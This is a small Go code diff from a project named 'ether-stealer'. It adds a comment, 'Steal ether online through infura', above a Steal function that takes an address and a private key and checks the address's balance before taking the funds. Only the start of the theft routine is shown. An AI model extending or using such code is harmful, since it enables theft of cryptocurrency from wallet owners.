@@ -4,6 +4,7 @@ import (
 	"fmt"
 
 	"github.com/ethereum/go-ethereum/common"
+
 	"github.com/hexoul/ether-stealer/contract"
 	"github.com/hexoul/ether-stealer/json"
 	"github.com/hexoul/ether-stealer/log"
@@ -39,6 +40,7 @@ func hasTxCount(addr string) (b bool, val string) {
 	return get(urlForTxCount, addr)
 }
 
+// Steal ether online through infura
 func Steal(addr common.Address, privkey []byte) {
 	addrStr := addr.String()
 	if canStealEther, _ := hasBalance(addrStr); canStealEther {
